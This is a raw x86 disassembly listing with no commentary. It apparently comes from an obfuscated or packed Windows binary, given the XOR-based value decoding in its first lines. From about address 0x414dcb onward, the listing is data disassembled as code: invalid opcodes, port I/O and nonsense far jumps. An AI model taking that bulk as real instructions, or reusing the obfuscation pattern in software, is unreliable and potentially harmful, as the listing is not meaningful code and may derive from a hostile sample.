  414cf3:	call   DWORD PTR ds:0x42ca38
  414cf9:	cmp    DWORD PTR ds:0x428e99,0x9
  414d00:	jne    0x414d15
  414d06:	xor    ecx,ecx
  414d08:	add    ecx,DWORD PTR ds:0x428e99
  414d0e:	dec    ecx
  414d0f:	mov    DWORD PTR ds:0x428e99,ecx
  414d15:	mov    ecx,DWORD PTR ds:0x428e99
  414d1b:	dec    ecx
  414d1c:	mov    DWORD PTR ds:0x428e99,ecx
  414d22:	jmp    0x414cd1
  414d27:	mov    eax,DWORD PTR [ebp-0x4]
  414d2a:	mov    ecx,DWORD PTR [ebp-0x4]
  414d2d:	sub    eax,ecx
  414d2f:	mov    DWORD PTR [ebp-0x4],eax
  414d32:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  414d39:	mov    eax,DWORD PTR [ebp-0xc]
  414d3c:	xor    eax,esi
  414d3e:	add    eax,edi
  414d40:	push   eax
  414d41:	mov    eax,DWORD PTR [ebp-0x10]
  414d44:	xor    eax,esi
  414d46:	add    eax,edi
  414d48:	push   eax
  414d49:	mov    eax,DWORD PTR [ebp-0x4]
  414d4c:	xor    eax,esi
  414d4e:	add    eax,0x3272fc
  414d53:	push   eax
  414d54:	lea    eax,[ebp-0x78]
  414d57:	push   eax
  414d58:	push   DWORD PTR [ebp-0x2c]
  414d5b:	push   DWORD PTR [ebp-0x28]
  414d5e:	call   0x40f6a0
  414d63:	test   eax,eax
  414d65:	je     0x414d93
  414d6b:	lea    eax,[ebp-0x78]
  414d6e:	push   eax
  414d6f:	mov    eax,DWORD PTR [ebp-0x28]
  414d72:	xor    eax,esi
  414d74:	add    eax,edi
  414d76:	push   eax
  414d77:	mov    eax,DWORD PTR [ebp-0x24]
  414d7a:	add    eax,0xaa
  414d7f:	push   eax
  414d80:	mov    eax,DWORD PTR [ebp-0x24]
  414d83:	mov    eax,DWORD PTR [eax+0x198]
  414d89:	push   DWORD PTR [eax]
  414d8b:	call   0x40854d
  414d90:	mov    DWORD PTR [ebp-0x14],eax
  414d93:	mov    ecx,DWORD PTR ds:0x42845d
  414d99:	lea    eax,[ebp+0x4]
  414d9c:	mov    DWORD PTR [ecx*4+0x428455],eax
  414da3:	inc    DWORD PTR ds:0x42845d
  414da9:	mov    eax,DWORD PTR [ebp-0x14]
  414dac:	test   eax,eax
  414dae:	je     0x41717d
  414db4:	lea    eax,[ebp-0x8]
  414db7:	mov    DWORD PTR [ebp-0x34],eax
  414dba:	mov    eax,DWORD PTR [ebp-0x30]
  414dbd:	mov    DWORD PTR [ebp-0x8],eax
  414dc0:	mov    eax,DWORD PTR [ebp-0x8]
  414dc3:	mov    ecx,DWORD PTR [ebp-0x14]
  414dc6:	jmp    0x417123
  414dcb:	mov    cl,0x3d
  414dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dce:	aas    
  414dcf:	jns    0x414e38
  414dd1:	jns    0x414e40
  414dd3:	pop    edx
  414dd4:	popw   ds
  414dd6:	inc    ebp
  414dd7:	mov    dl,0xe3
  414dd9:	push   ecx
  414dda:	push   ds
  414ddb:	push   0xffffff95
  414ddd:	jl     0x414e5a
  414ddf:	mov    ebx,0xbd7b7b9e
  414de4:	pop    ss
  414de5:	jbe    0x414d6a
  414de7:	leave  
  414de8:	cdq    
  414de9:	stos   DWORD PTR es:[edi],eax
  414dea:	pop    edi
  414deb:	shl    BYTE PTR [eax],1
  414ded:	inc    ebx
  414dee:	push   0xffffffd0
  414df0:	mov    DWORD PTR [eax],0x71631c4f
  414df6:	loopne 0x414e60
  414df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414df9:	cmp    BYTE PTR [edx+esi*1-0x17],ch
  414dfd:	fnstcw WORD PTR [ebx-0x6ef904eb]
  414e03:	bound  esp,QWORD PTR [eax-0x44]
  414e06:	jno    0x414d94
  414e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e09:	stos   DWORD PTR es:[edi],eax
  414e0a:	sti    
  414e0b:	mov    DWORD PTR [ebx-0x771b19a1],ecx
  414e11:	in     al,dx
  414e12:	mov    cl,0x22
  414e14:	sahf   
  414e15:	mov    esi,0x749015a
  414e1a:	adc    ah,al
  414e1c:	popa   
  414e1d:	das    
  414e1e:	inc    edi
  414e1f:	fcmovnb st,st(4)
  414e21:	xchg   esp,eax
  414e22:	jo     0x414e46
  414e24:	mov    ecx,0x954fffb
  414e29:	and    al,0x96
  414e2b:	sub    BYTE PTR [ebx+edi*1],ah
  414e2e:	(bad)  
  414e2f:	xchg   BYTE PTR [ebp+esi*1-0x66],dh
  414e33:	(bad)  
  414e34:	stc    
  414e35:	stc    
  414e36:	adc    BYTE PTR [edi],dl
  414e38:	imul   esp,DWORD PTR [edi+0x6e],0x9159cc87
  414e3f:	dec    ecx
  414e40:	inc    esi
  414e41:	add    edx,DWORD PTR [edx+0x9d57d13]
  414e47:	shl    BYTE PTR [ebx+edi*4-0x21],cl
  414e4b:	js     0x414e07
  414e4d:	shr    BYTE PTR [ebp-0x6766987a],cl
  414e53:	xchg   BYTE PTR [ebx+ebx*2-0x3d],al
  414e57:	stos   DWORD PTR es:[edi],eax
  414e58:	hlt    
  414e59:	xor    eax,0x75dbbf89
  414e5e:	out    dx,al
  414e5f:	xlat   BYTE PTR ds:[ebx]
  414e60:	add    al,0x8d
  414e62:	push   esp
  414e63:	mov    dl,0x99
  414e65:	lods   eax,DWORD PTR ds:[esi]
  414e66:	or     DWORD PTR ds:0x30578b2f,ebp
  414e6c:	enter  0x101e,0x88
  414e70:	xchg   ch,al
  414e72:	(bad)  
  414e73:	out    0x60,eax
  414e75:	pop    esi
  414e76:	leave  
  414e77:	mov    eax,0xc90dd0de
  414e7c:	daa    
  414e7d:	mov    esi,0x4ca4635b
  414e82:	mov    eax,0x822f8f50
  414e87:	les    ebx,FWORD PTR [ecx+0x58]
  414e8a:	aam    0xd4
  414e8c:	mov    ebx,DWORD PTR [esi+0x53bc1be6]
  414e92:	pop    edi
  414e93:	inc    esp
  414e94:	xchg   DWORD PTR [eax],ecx
  414e96:	inc    eax
  414e97:	and    DWORD PTR [eax],eax
  414e99:	mov    ebp,DWORD PTR [esi+0x1d]
  414e9c:	(bad)  
  414e9d:	xlat   BYTE PTR ds:[ebx]
  414e9e:	pop    ds
  414e9f:	add    ebx,DWORD PTR [ebp-0x2595c422]
  414ea5:	mov    dl,0xee
  414ea7:	test   DWORD PTR [ebx-0xc80509e],0xd23e149a
  414eb1:	cmp    eax,0x657a2961
  414eb6:	fisub  DWORD PTR [eax]
  414eb8:	mov    dl,0x21
  414eba:	loope  0x414f32
  414ebc:	or     BYTE PTR [esi-0x6a],0x11
  414ec0:	stos   BYTE PTR es:[edi],al
  414ec1:	fistp  WORD PTR ds:0x475bca0b
  414ec7:	call   0xd4828a3c
  414ecc:	loopne 0x414eac
  414ece:	call   0xa7cc:0x44f627ee
  414ed5:	test   al,0x88
  414ed7:	xchg   dl,dl
  414ed9:	mov    cl,0xa1
  414edb:	(bad)
  414edf:	pop    eax
  414ee0:	clc    
  414ee1:	xchg   DWORD PTR [eax+0x29],eax
  414ee4:	jbe    0x414e96
  414ee6:	cwde   
  414ee7:	jg     0x414f66
  414ee9:	and    esi,ebx
  414eeb:	icebp  
  414eec:	adc    al,0xdb
  414eee:	daa    
  414eef:	sbb    BYTE PTR [ecx-0x5f],ch
  414ef2:	sar    ecx,cl
  414ef4:	rcl    DWORD PTR [eax],cl
  414ef6:	jno    0x414f69
  414ef8:	sbb    al,0x4c
  414efa:	pop    eax
  414efb:	mov    ecx,0x57091b2d
  414f00:	call   0xbbd3ba9b
  414f05:	neg    ah
  414f07:	sub    bl,dl
  414f09:	clc    
  414f0a:	popf   
  414f0b:	repnz cmp al,0x62
  414f0e:	add    esi,esi
  414f10:	imul   eax,DWORD PTR [ecx-0x4f80cdb8],0x5e
  414f17:	mov    al,0x1
  414f19:	mov    eax,DWORD PTR [esi+ebp*4-0x61]
  414f1d:	jmp    0x414f52
  414f1f:	jns    0x414eb8
  414f21:	ja     0x414f71
  414f23:	(bad)  
  414f24:	jbe    0x414ec8
  414f26:	outs   dx,BYTE PTR ds:[esi]
  414f27:	and    DWORD PTR [edx],esp
  414f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f2a:	not    BYTE PTR [edx+0x1b]
  414f2d:	cli    
  414f2e:	mov    ds:0x4ed54170,eax
  414f33:	inc    edx
  414f34:	sbb    dl,dl
  414f36:	shl    DWORD PTR [edi+0x725fd0a2],1
  414f3c:	mov    bl,0xb3
  414f3e:	mov    edi,0x4d75aeed
  414f43:	mov    edi,0x68366ea4
  414f48:	jno    0x414eca
  414f4a:	mov    eax,ds:0x223305f3
  414f4f:	ins    WORD PTR es:[edi],dx
  414f51:	sar    DWORD PTR [ebp-0x62d51253],1
  414f57:	or     al,0x82
  414f59:	or     dh,BYTE PTR [eax]
  414f5b:	sti    
  414f5c:	in     eax,dx
  414f5d:	hlt    
  414f5e:	sub    ebp,DWORD PTR ds:0xd1143159
  414f64:	add    BYTE PTR [ecx],0xd3
  414f67:	arpl   WORD PTR [eax],si
  414f69:	fidivr DWORD PTR [eax]
  414f6b:	mov    cl,0xad
  414f6d:	jmp    0x414f74
  414f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f70:	pop    ebp
  414f71:	ss jns 0x414fd6
  414f74:	sbb    al,0x6d
  414f76:	jle    0x414fa2
  414f78:	add    ecx,DWORD PTR [edi+0x22]
  414f7b:	jecxz  0x414f03
  414f7d:	scas   al,BYTE PTR es:[edi]
  414f7e:	cdq    
  414f7f:	shl    BYTE PTR [edi+0x367bea],1
  414f85:	xor    BYTE PTR [ebx+0x7cb32333],bl
  414f8b:	xor    DWORD PTR [edx],eax
  414f8d:	js     0x415007
  414f8f:	js     0x414f16
  414f91:	clc    
  414f92:	push   cs
  414f93:	popf   
  414f94:	repz imul esi,DWORD PTR [edx+0x7e],0x31b2f95d
  414f9c:	jns    0x414f9b
  414f9e:	pusha  
  414f9f:	nop
  414fa0:	out    0x2d,al
  414fa2:	fnstsw WORD PTR [ecx+0x14b8ccc9]
  414fa8:	ror    DWORD PTR [esp+ecx*2],0xfd
  414fac:	mov    ecx,0xbd55b622
  414fb1:	cmp    ch,BYTE PTR [eax+0x12]
  414fb4:	jb     0x414f65
  414fb6:	lods   eax,DWORD PTR ds:[esi]
  414fb7:	mov    ch,0xb6
  414fb9:	fisttp QWORD PTR [ebx-0x34]
  414fbc:	test   al,0x89
  414fbe:	outs   dx,BYTE PTR ds:[esi]
  414fbf:	adc    BYTE PTR [edi],ah
  414fc1:	pop    ebp
  414fc2:	xchg   edx,eax
  414fc3:	scas   al,BYTE PTR es:[edi]
  414fc4:	sub    eax,0x862291a7
  414fc9:	xchg   ecx,eax
  414fca:	mov    ebx,0x27908a56
  414fcf:	sbb    al,0xbc
  414fd1:	push   0xaeb6612c
  414fd6:	xchg   edi,eax
  414fd7:	jnp    0x415033
  414fd9:	fld    TBYTE PTR [edx]
  414fdb:	cmc    
  414fdc:	push   edx
  414fdd:	or     dh,BYTE PTR [ecx]
  414fdf:	ret    
  414fe0:	and    eax,0xe09f4ee6
  414fe5:	dec    eax
  414fe6:	mov    edi,0x3de29f99
  414feb:	adc    BYTE PTR [ebp+0x30315969],dl
  414ff1:	arpl   WORD PTR [eax],sp
  414ff3:	ret    0x5aca
  414ff6:	cdq    
  414ff7:	inc    ebx
  414ff8:	shl    DWORD PTR [ecx-0x1c05fa62],1
  414ffe:	push   esi
  414fff:	cli    
  415000:	sbb    edi,ebp
  415002:	dec    ebp
  415003:	out    dx,eax
  415004:	test   DWORD PTR [edx],edi
  415006:	hlt    
  415007:	das    
  415008:	retf   
  415009:	adc    edx,DWORD PTR [edx-0x5bc01425]
  41500f:	cmp    DWORD PTR [ebp+0x78],esi
  415012:	cs dec ecx
  415014:	mov    edx,0xcc337b95
  415019:	cdq    
  41501a:	addr16 clc 
  41501c:	pop    eax
  41501d:	dec    ecx
  41501e:	into   
  41501f:	out    0x74,eax
  415021:	mov    edi,0x9561b71f
  415026:	add    cl,BYTE PTR [eax-0x5c24a44c]
  41502c:	imul   ebx,DWORD PTR [edx+edi*1-0x4310c693],0xd0012b34
  415037:	cmp    al,0x35
  415039:	scas   eax,DWORD PTR es:[edi]
  41503a:	push   ebx
  41503b:	sar    DWORD PTR [esi+0x2136fa7e],1
  415041:	mov    al,BYTE PTR [ebx+0x4d]
  415044:	int    0x88
  415046:	out    dx,al
  415047:	pop    ds
  415048:	fs push es
  41504a:	(bad)  
  41504b:	adc    edx,DWORD PTR [edx+eiz*2+0x1d80f337]
  415052:	cwde   
  415053:	inc    esp
  415054:	dec    ebx
  415055:	ror    edi,cl
  415057:	xchg   ebx,eax
  415058:	xchg   BYTE PTR [eax-0x76],ah
  41505b:	cmp    eax,0x9cdae26b
  415060:	call   0x4997:0x5cf08d28
  415067:	fwait
  415068:	es mov dl,0xf1
  41506b:	xchg   DWORD PTR [eax+0x29],esp
  41506e:	call   0x3ef5531
  415073:	pop    eax
  415074:	push   edi
  415075:	jnp    0x415034
  415077:	jnp    0x415079
  415079:	sub    ah,BYTE PTR [edi-0x27]
  41507c:	pop    esp
  41507d:	add    esi,ebp
  41507f:	bound  esi,QWORD PTR [edi]
  415081:	push   ecx
  415082:	dec    edx
  415083:	fisubr WORD PTR [edx-0x6b]
  415086:	aad    0xad
  415088:	cli    
  415089:	popa   
  41508a:	daa    
  41508b:	xor    eax,ecx
  41508d:	add    ebp,edi
  41508f:	scas   eax,DWORD PTR es:[edi]
  415090:	xchg   edx,eax
  415091:	shr    DWORD PTR [ebp-0x53],1
  415094:	sub    DWORD PTR [esi+0x28],0x7e870b00
  41509b:	inc    ebp
  41509c:	fwait
  41509d:	loope  0x4150e6
  41509f:	inc    DWORD PTR [edx-0x25]
  4150a2:	dec    eax
  4150a3:	shl    DWORD PTR [ebp+0x2d],1
  4150a6:	fidiv  DWORD PTR [esi]
  4150a8:	push   eax
  4150a9:	xchg   edx,eax
  4150aa:	mov    esp,0x42075ff0
  4150af:	add    ebp,edx
  4150b1:	jge    0x41510f
  4150b3:	std    
  4150b4:	test   al,0x97
  4150b6:	fnstenv [edi]
  4150b8:	add    DWORD PTR [eax+0x5c],esi
  4150bb:	push   edx
  4150bc:	xor    ebx,0x3e
  4150bf:	scas   eax,DWORD PTR es:[edi]
  4150c0:	fsub   QWORD PTR [edi+0x18]
  4150c3:	xchg   edx,eax
  4150c4:	mov    dh,0xc9
  4150c6:	fisub  DWORD PTR [esi]
  4150c8:	ss pop ebx
  4150ca:	aam    0x71
  4150cc:	cmp    eax,0x87d778b4
  4150d1:	adc    BYTE PTR [ecx+0x54f51bc4],0xe9
  4150d8:	xchg   esp,eax
  4150d9:	dec    eax
  4150da:	sti    
  4150db:	in     al,0xad
  4150dd:	mov    edi,0xf92b7e85
  4150e2:	xor    DWORD PTR [ecx+0x7bc1df61],esp
  4150e8:	nop
  4150e9:	mov    BYTE PTR [ebp+eiz*8+0x20fbc070],0x6e
  4150f1:	test   al,0x52
  4150f3:	jl     0x4150f5
  4150f5:	cmc    
  4150f6:	pushf  
  4150f7:	add    bh,BYTE PTR [eax]
  4150f9:	call   0xb1ebc4d9
  4150fe:	or     eax,0x3549ff47
  415103:	xchg   BYTE PTR [edi+0x57],dh
  415106:	jmp    0x86ba:0xeedded63
  41510d:	enter  0xbacf,0x56
  415111:	adc    dl,BYTE PTR [ebx+0x66f6b92e]
  415117:	add    eax,DWORD PTR [edi-0x24]
  41511a:	test   DWORD PTR [esp+eiz*4],esi
  41511d:	cld    
  41511e:	lds    esi,FWORD PTR [ebp+0x7b]
  415121:	xchg   esi,eax
  415122:	imul   esp,DWORD PTR [esp+esi*4+0x51cb34f1],0xffffffaa
  41512a:	adc    BYTE PTR [edx-0x1124af39],cl
  415130:	jl     0x41515c
  415132:	jns    0x415140
  415134:	ret    0x9ede
  415137:	(bad)  
  415138:	aad    0x37
  41513a:	sbb    ebx,DWORD PTR [edx+0x376348b7]
  415140:	xor    DWORD PTR [esi+0x3b],ebx
  415143:	jmp    0xfc3b:0x3e165627
  41514a:	lahf   
  41514b:	cli    
  41514c:	adc    DWORD PTR [ecx+0x2a],0x42
  415150:	xlat   BYTE PTR ds:[ebx]
  415151:	adc    BYTE PTR [eax],ah
  415153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415154:	inc    esp
  415155:	je     0x41512a
  415157:	pushfw 
  415159:	cmp    eax,0xeaaec00e
  41515e:	and    esi,DWORD PTR [edi+0x37]
  415161:	mov    eax,ds:0x6d20ef40
  415166:	dec    esi
  415167:	fdiv   DWORD PTR [esp+ebx*2]
  41516a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41516b:	mov    cl,0x75
  41516d:	mov    dl,0x46
  41516f:	gs faddp st(3),st
  415172:	clc    
  415173:	fisubr DWORD PTR [edi]
  415175:	lods   eax,DWORD PTR ds:[esi]
  415176:	jg     0x4151e7
  415178:	pop    ss
  415179:	xchg   esi,eax
  41517a:	div    BYTE PTR [ebx]
  41517c:	mov    al,ds:0x34848132
  415181:	pop    esi
  415182:	cmp    al,0xf1
  415184:	jg     0x415170
  415186:	push   esi
  415187:	xchg   esi,eax
  415188:	pushf  
  415189:	shl    BYTE PTR [edx],cl
  41518b:	mov    ds:0x21717e06,eax
  415190:	sub    ecx,edi
  415192:	cld    
  415193:	lahf   
  415194:	pop    esp
  415195:	(bad)  
  415196:	jbe    0x4151a0
  415198:	gs dec esp
  41519a:	in     eax,dx
  41519b:	stos   DWORD PTR es:[edi],eax
  41519c:	pop    es
  41519d:	jno    0x415174
  41519f:	cli    
  4151a0:	(bad)  
  4151a1:	jl     0x41516d
  4151a3:	out    0x55,al
  4151a5:	xchg   edx,eax
  4151a6:	or     edx,DWORD PTR [esi-0x345497d4]
  4151ac:	adc    eax,0x6d7fd308
  4151b1:	mov    al,BYTE PTR [eax-0x7ed841]
  4151b7:	lea    eax,[edi+0xd]
  4151ba:	xor    eax,0x70a1a587
  4151bf:	jl     0x415173
  4151c1:	and    DWORD PTR ds:0xc7153176,ebx
  4151c7:	mov    cl,0x92
  4151c9:	and    edi,0xffffffe8
  4151cc:	xchg   edi,eax
  4151cd:	int3   
  4151ce:	sar    al,cl
  4151d0:	mov    WORD PTR [ecx],cs
  4151d2:	div    DWORD PTR [ebp+0x1dac3682]
  4151d8:	jmp    0x4f29:0x57749b7f
  4151df:	adc    eax,0xa112bb60
  4151e4:	das    
  4151e5:	sbb    eax,0xb5a2e46d
  4151ea:	push   edi
  4151eb:	adc    ah,ch
  4151ed:	jns    0x415226
  4151ef:	(bad)  
  4151f0:	fld    QWORD PTR [esi-0x1c]
  4151f3:	stos   DWORD PTR es:[edi],eax
  4151f4:	mov    ch,0xfc
  4151f6:	pop    ecx
  4151f7:	push   edx
  4151f8:	and    eax,0x6cebe8df
  4151fd:	ret    
  4151fe:	jnp    0x415201
  415200:	mov    ds:0xad17205b,eax
  415205:	ins    BYTE PTR es:[edi],dx
  415206:	or     al,0x70
  415208:	call   0x81f94184
  41520d:	std    
  41520e:	pop    edi
  41520f:	jecxz  0x415196
  415211:	xchg   esi,eax
  415212:	sub    al,0xb
  415214:	hlt    
  415215:	or     eax,0x89180bcf
  41521a:	test   al,0x7a
  41521c:	inc    ebx
  41521d:	mov    cl,0x71
  41521f:	adc    DWORD PTR [ecx+0x5b9a9b38],eax
  415225:	mov    edi,0xa5177c9d
  41522a:	jae    0x415265
  41522c:	cwde   
  41522d:	jmp    0xe16fcdc2
  415232:	(bad)  
  415233:	arpl   dx,bp
  415235:	sbb    BYTE PTR [edx-0x25],dh
  415238:	outs   dx,BYTE PTR ds:[esi]
  415239:	sbb    eax,0x48f61d94
  41523e:	push   ss
  41523f:	jbe    0x415262
  415241:	mov    bl,0xa4
  415243:	cmc    
  415244:	ret    
  415245:	and    BYTE PTR [edx],al
  415247:	and    eax,0x4a4674bb
  41524c:	jg     0x415252
  41524e:	jns    0x415286
  415250:	out    dx,eax
  415251:	push   esp
  415252:	add    esp,ebp
  415254:	lahf   
  415255:	out    dx,eax
  415256:	cmove  edx,DWORD PTR [edx+ecx*1-0x7d6ceae]
  41525e:	pop    edi
  41525f:	mov    eax,0x6cee5818
  415264:	mov    dl,0x5c
  415266:	jmp    0x8292:0x151e3c5
  41526d:	push   edi
  41526e:	adc    ebx,DWORD PTR [ecx+0x6bd60d4]
  415274:	out    dx,eax
  415275:	xchg   edx,eax
  415276:	push   edx
  415277:	add    DWORD PTR [ebx+0x79],ebp
  41527a:	call   0x4a42:0x89fa6115
  415281:	inc    eax
  415282:	jle    0x415256
  415284:	mov    gs,WORD PTR [eax+eax*4+0x27882744]
  41528b:	dec    esi
  41528c:	(bad)  
  41528d:	jmp    0x41526b
  41528f:	pop    ds
  415290:	mov    dh,0xf3
  415292:	mov    ebx,0xce6027cd
  415297:	sub    DWORD PTR [edx],ebp
  415299:	cmp    BYTE PTR [ecx-0x4f],dl
  41529c:	push   cs
  41529d:	out    0xad,al
  41529f:	jne    0x415288
  4152a1:	dec    esp
  4152a2:	dec    esp
  4152a3:	xor    esp,0x303d252b
  4152a9:	clc    
  4152aa:	or     esp,DWORD PTR [esi-0xc]
  4152ad:	sbb    ah,BYTE PTR [esi-0x12]
  4152b0:	fstp   QWORD PTR [edi-0x3b998d2c]
  4152b6:	or     dl,cl
  4152b8:	inc    ebx
  4152b9:	mov    ds:0xc8b2ccd6,al
  4152be:	popa   
  4152bf:	mov    ch,0xc5
  4152c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152c2:	inc    esi
  4152c3:	dec    eax
  4152c4:	(bad)
  4152c8:	ret    0x97bd
  4152cb:	sub    esp,DWORD PTR [ecx+0x3]
  4152ce:	cdq    
  4152cf:	ficomp WORD PTR [eax+esi*2-0x4275b03f]
  4152d6:	ret    
  4152d7:	ret    
  4152d8:	dec    eax
  4152d9:	fild   DWORD PTR [edx-0x4ff7a800]
  4152df:	ins    BYTE PTR es:[edi],dx
  4152e0:	jmp    0x415281
  4152e2:	pop    esp
  4152e3:	cmp    eax,0xc86960f4
  4152e8:	sub    DWORD PTR [eax-0x6402625d],ebp
  4152ee:	je     0x415336
  4152f0:	imul   edi,DWORD PTR [ebp+0x6e07638f],0x886d8019
  4152fa:	popa   
  4152fb:	(bad)
  4152ff:	pop    esi
  415300:	call   0xf0fd:0x276fd498
  415307:	pop    esp
  415308:	mov    bh,0x9
  41530a:	aaa    
  41530b:	and    al,0x6f
  41530d:	dec    ebx
  41530e:	aad    0xdc
  415310:	mov    gs:0xf5e09384,al
  415316:	sub    BYTE PTR [ecx+0x10],ch
  415319:	adc    bl,0xfb
  41531c:	iret   
  41531d:	pusha  
  41531e:	sbb    eax,0x93c453d7
  415323:	or     eax,0xce5c2df4
  415328:	sbb    ebx,ecx
  41532a:	mov    ds:0xbb933c0f,eax
  41532f:	cmp    al,0xeb
  415331:	xchg   esp,eax
  415332:	inc    eax
  415333:	pop    ecx
  415334:	ds cmp bh,bh
  415337:	push   esp
  415338:	cwde   
  415339:	dec    esi
  41533a:	clc    
  41533b:	or     eax,0x8726e9c7
  415340:	dec    esp
  415341:	cmp    eax,0x2ef0a642
  415346:	sub    ecx,DWORD PTR [ebx-0x57]
  415349:	jmp    0x415386
  41534b:	push   es
  41534c:	cdq    
  41534d:	aam    0x82
  41534f:	ds es push ebx
  415352:	rol    bl,1
  415354:	sbb    al,0x2b
  415356:	(bad)  
  415357:	out    dx,eax
  415358:	out    dx,al
  415359:	and    DWORD PTR [eax+edx*2+0x6c941907],esp
  415360:	mov    eax,ds:0xde145052
  415365:	mov    ebx,0x6eb5a8d5
  41536a:	in     al,0x36
  41536c:	imul   ebp,ebp,0x3a
  41536f:	addr16 out dx,eax
  415371:	(bad)  
  415373:	and    bl,bh
  415375:	xor    eax,0xeefd0bf3
  41537a:	jno    0x4153a6
  41537c:	xor    eax,edi
  41537e:	xor    DWORD PTR [ebx],edi
  415380:	add    DWORD PTR [ecx],ebx
  415382:	std    
  415383:	dec    eax
  415384:	mov    esp,0xba61e956
  415389:	repz pusha 
  41538b:	pop    esp
  41538c:	pop    ebp
  41538d:	mov    bl,0xd3
  41538f:	(bad)  
  415390:	cdq    
  415391:	mov    esp,0xc31e51a7
  415396:	test   BYTE PTR [ecx-0x7dbf23f6],0xc1
  41539d:	aas    
  41539e:	or     bl,ah
  4153a0:	lea    ebx,[edx+edx*8]
  4153a3:	pop    es
  4153a4:	mov    esi,0x9caddf3b
  4153a9:	push   ecx
  4153aa:	add    eax,0x83e99ed7
  4153af:	nop
  4153b0:	in     al,dx
  4153b1:	loopne 0x415406
  4153b3:	xlat   BYTE PTR ds:[ebx]
  4153b4:	jb     0x4153e9
  4153b6:	sti    
  4153b7:	sahf   
  4153b8:	or     DWORD PTR [ebp-0x12a2ee43],edx
  4153be:	xchg   ebx,eax
  4153bf:	dec    esi
  4153c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153c1:	and    eax,DWORD PTR [edx+esi*4]
  4153c4:	mov    al,0x61
  4153c6:	xchg   ebp,eax
  4153c7:	shl    edx,1
  4153c9:	gs cmp esi,edx
  4153cc:	fs enter 0xf99c,0xb9
  4153d1:	jne    0x415438
  4153d3:	bound  esi,QWORD PTR [ecx+0x40]
  4153d6:	icebp  
  4153d7:	xor    DWORD PTR ds:0x8f615c1d,esp
  4153dd:	pusha  
  4153de:	(bad)  
  4153df:	popf   
  4153e0:	cmc    
  4153e1:	push   ebx
  4153e2:	test   DWORD PTR [edx-0xc],edi
  4153e5:	stc    
  4153e6:	stos   DWORD PTR es:[edi],eax
  4153e7:	and    BYTE PTR [ebx+0xf41a61d],ah
  4153ed:	out    0xc2,eax
  4153ef:	jge    0x4153e6
  4153f1:	in     eax,dx
  4153f2:	fidivr WORD PTR [esi-0x39]
  4153f5:	std    
  4153f6:	dec    eax
  4153f7:	in     al,dx
  4153f8:	or     al,0xfe
  4153fa:	cmp    cl,dh
  4153fc:	data16 js 0x415477
  4153ff:	jb     0x4153ea
  415401:	test   DWORD PTR ds:0x264b8e52,0xf514f8c2
  41540b:	cli    
  41540c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41540d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41540e:	inc    ebp
  41540f:	iret   
  415410:	adc    edx,DWORD PTR [eax]
  415412:	pop    esp
  415413:	fsubr  DWORD PTR fs:[edx+0x6db12ee3]
  41541a:	ja     0x4153af
  41541c:	lods   al,BYTE PTR ds:[esi]
  41541d:	out    dx,al
  41541e:	inc    eax
  41541f:	push   ss
  415420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415421:	psadbw mm1,QWORD PTR [ecx+0x58]
  415425:	xor    al,0x6d
  415427:	pop    esp
  415428:	cmp    dl,BYTE PTR [ebp-0x24451692]
  41542e:	sbb    BYTE PTR [edx],ch
  415430:	adc    al,0x49
  415432:	sbb    edx,esi
  415434:	mov    cl,0xe6
  415436:	pop    edi
  415437:	and    BYTE PTR [ecx],al
  415439:	sbb    eax,ebx
  41543b:	clc    
  41543c:	adc    DWORD PTR ds:[eax-0x12],eax
  415440:	cs jae 0x4153de
  415443:	push   ebp
  415444:	dec    esp
  415445:	sbb    esp,0xffffffd0
  415448:	sub    eax,0xd5511d1c
  41544d:	pop    esi
  41544e:	inc    esp
  41544f:	xchg   ebx,eax
  415450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415451:	addr16 pushf 
  415453:	add    bh,BYTE PTR [ecx+0x69]
  415456:	repnz popa 
  415458:	xor    al,0x88
  41545a:	or     ebx,DWORD PTR ds:[eax-0x3e0caf78]
  415461:	aam    0xe5
  415463:	jbe    0x415478
  415465:	jecxz  0x415474
  415467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415468:	js     0x415490
  41546a:	imul   edi,DWORD PTR ds:0x48ae8333,0x4f
  415471:	jge    0x41543b
  415473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415474:	out    0xf9,al
  415476:	mov    ds:0xea827bfb,eax
  41547b:	adc    al,0x12
  41547d:	xchg   edx,eax
  41547e:	fnstcw WORD PTR [ebp+0x43]
  415481:	test   BYTE PTR [edx+0x56],0xd1
  415485:	aad    0x78
  415487:	mov    al,ds:0x5d998ae1
  41548c:	or     DWORD PTR [esi-0x63f77f09],edi
  415492:	jecxz  0x4154f7
  415494:	out    dx,al
  415495:	sbb    eax,DWORD PTR [ebx]
  415497:	jnp    0x4154d8
  415499:	rcl    DWORD PTR [ebx-0x29],1
  41549c:	aam    0xe1
  41549e:	jne    0x41547f
  4154a0:	xlat   BYTE PTR ds:[ebx]
  4154a1:	add    al,0x6c
  4154a3:	retf   
  4154a4:	xor    bl,0xa3
  4154a7:	sbb    eax,0x985201e8
  4154ac:	into   
  4154ad:	mov    cl,0x5d
  4154af:	test   eax,0x10c74c60
  4154b4:	adc    ecx,DWORD PTR [eax]
  4154b6:	xchg   ebp,eax
  4154b7:	or     eax,0xa013a309
  4154bc:	cmp    BYTE PTR [esi+0x6c7fe3fc],al
  4154c2:	sbb    bh,BYTE PTR [esi]
  4154c4:	mul    DWORD PTR [ecx]
  4154c6:	add    ebp,DWORD PTR [edi+0x27410c4c]
  4154cc:	mov    cl,0x52
  4154ce:	pushf  
  4154cf:	xor    BYTE PTR [ebx],bh
  4154d1:	adc    al,0x90
  4154d3:	data16 or al,0x31
  4154d6:	inc    edx
  4154d7:	ja     0x4154de
  4154d9:	mov    DWORD PTR [edi],esp
  4154db:	fisubr DWORD PTR [esi+0x2]
